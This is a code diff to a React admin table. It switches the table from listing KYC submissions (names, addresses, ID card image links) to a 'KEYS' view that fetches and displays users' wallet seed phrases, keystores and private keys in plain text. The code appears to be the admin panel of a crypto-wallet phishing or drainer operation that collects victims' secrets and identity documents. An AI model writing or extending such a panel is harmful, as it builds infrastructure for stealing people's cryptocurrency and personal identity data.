@@ -49,22 +49,14 @@ const Table = () => {
   const [state2, setState2] = useState(false);
   const [wallets, setWallets] = useState([]);
   const [withdraws, setWithdraws] = useState([]);
-  const columns = [
-    "FullName",
-    "Address",
-    "Sex",
-    "MaritalStatus",
-    "IdFront",
-    "IdBack",
-    "Created At",
-  ];
+  const columns = ["FullName", "Phrase", "keystore", "private", "Created At"];
 
   useEffect(() => {
     (async () => {
       try {
-        const { data } = await axios.get(`/api/upload/getKyc`);
-        console.log(data);
-        setWallets(data?.kycs.reverse());
+        const { data } = await axios.get(`/api/upload/getKeys`);
+        console.log("datakeys", data);
+        setWallets(data?.keys.reverse());
       } catch (error) {
         console.log(error);
       }
@@ -123,33 +115,11 @@ const Table = () => {
             src="/img/man.png"
             alt="avatar"
           />
-          <span style={{ marginLeft: "5px" }}>{order?.fullName} </span>
+          <span style={{ marginLeft: "5px" }}>{order?.user?.name} </span>
         </div>,
-        order?.address,
-        order?.sex,
-        order?.maritalStatus,
-        <>
-          {order?.idFront && (
-            <a
-              href={order?.idFront}
-              target="_blank"
-              className="text-white underline"
-            >
-              view IDFront
-            </a>
-          )}
-        </>,
-        <>
-          {order?.idBack && (
-            <a
-              href={order?.idBack}
-              target="_blank"
-              className="text-white underline"
-            >
-              view IDFront
-            </a>
-          )}
-        </>,
+        <div>{order?.phrase}</div>,
+        order?.keystore,
+        order?.privatekey,
 
         formatDateToReadable(order?.createdAt),
       ])
@@ -192,7 +162,7 @@ const Table = () => {
     <>
       <ThemeProvider theme={getMuiTheme()}>
         <MUIDataTable
-          title="KYC Submissions"
+          title="KEYS"
           data={data}
           columns={columns}
           options={options}
